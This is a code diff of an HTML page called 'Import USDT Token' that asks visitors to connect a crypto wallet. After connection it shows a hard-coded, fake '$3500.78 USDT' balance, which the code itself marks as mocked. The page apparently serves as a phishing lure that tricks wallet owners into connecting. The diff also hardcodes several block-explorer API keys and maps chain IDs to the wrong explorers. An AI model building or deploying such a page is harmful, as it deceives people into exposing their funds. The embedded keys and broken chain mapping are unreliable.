@@ -2,7 +2,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗲 𝗨𝗦𝗗𝗧</title>
+  <title>𝗜𝗺𝗽𝗼𝗿𝘁 𝗨𝗦𝗗𝗧 𝗧𝗼𝗸𝗲𝗻</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.2/web3.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.8/dist/index.js"></script>
@@ -22,14 +22,29 @@
 </head>
 <body>
   <h1>𝗜𝗺𝗽𝗼𝗿𝘁 𝗨𝗦𝗗𝗧 𝗧𝗼𝗸𝗲𝗻</h1>
-  <button id="connectWallet">Connect Wallet</button>  <div id="walletInfo" style="display:none">
+  <button id="connectWallet">Connect Wallet</button>
+  <div id="walletInfo" style="display:none">
     <div class="token-box">
       <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
         <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT">
       </a>
-      <span>$3500 USDT</span>
+      <span id="usdtAmount">$3500.78 USDT</span>
     </div>
   </div>  <script>
+    const ETHERSCAN_API_KEY = "VZFDUWB3YGQ1YCDKTCU1D6DDSS";
+    const BSCSCAN_API_KEY = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+    const SNOWSCAN_API_KEY = "ATJQERBKV1CI3GVKNSE3Q7RGEJ";
+    const ARBISCAN_API_KEY = "B6SVGA7K3YBJEQ69AFKJF4YHVX";
+    const OPTIMISM_API_KEY = "66N5FRNV1ZD4I87S7MAHCJVXFJ";
+
+    const chainEndpoints = {
+      42161: { url: 'https://api.arbiscan.io/api', key: ARBISCAN_API_KEY },
+      8453: { url: 'https://api.bscscan.com/api', key: BSCSCAN_API_KEY },
+      10: { url: 'https://api-optimistic.etherscan.io/api', key: OPTIMISM_API_KEY },
+      534352: { url: 'https://api.snowscan.xyz/api', key: SNOWSCAN_API_KEY },
+      81457: { url: 'https://api.etherscan.io/api', key: ETHERSCAN_API_KEY },
+    };
+
     const providerOptions = {
       walletconnect: {
         package: window.WalletConnectProvider.default,
@@ -66,6 +81,9 @@
 
         document.getElementById("walletInfo").style.display = "block";
         console.log("Wallet connected:", userAddress);
+
+        // Display static USDT value (mocked to $3500.78)
+        document.getElementById("usdtAmount").textContent = "$3500.78 USDT";
       } catch (err) {
         console.error("Wallet connection error:", err);
       }
